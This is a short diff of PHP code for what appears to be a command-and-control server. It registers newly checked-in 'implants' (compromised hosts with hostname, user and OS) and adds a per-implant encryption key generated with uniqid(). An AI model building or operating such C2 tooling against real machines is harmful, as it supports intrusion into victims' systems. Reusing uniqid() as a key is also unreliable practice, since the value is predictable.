@@ -38,12 +38,14 @@
     # If new host
     if ($row_count == "0") {
         # Inserts entry into "implants" table
-        $statement = $database_connection->prepare("INSERT INTO `implants` (`hostname`, `process_id`, `os`, `current_user`, `last_seen`) VALUES (:hostname, :process_id, :os, :current_user, :last_seen)");
+        # uniqid() is used to create a unique encryption key for the new implant
+        $statement = $database_connection->prepare("INSERT INTO `implants` (`hostname`, `process_id`, `os`, `current_user`, `last_seen`, `encryption_key`) VALUES (:hostname, :process_id, :os, :current_user, :last_seen, :encryption_key)");
         $statement->bindValue(":hostname", $hostname);
         $statement->bindValue(":process_id", $process_id);
         $statement->bindValue(":os", $os);
         $statement->bindValue(":current_user", $current_user);
         $statement->bindValue(":last_seen", $current_time);
+        $statement->bindValue(":encryption_key", uniqid());
         $statement->execute();
     }
     # Else old host
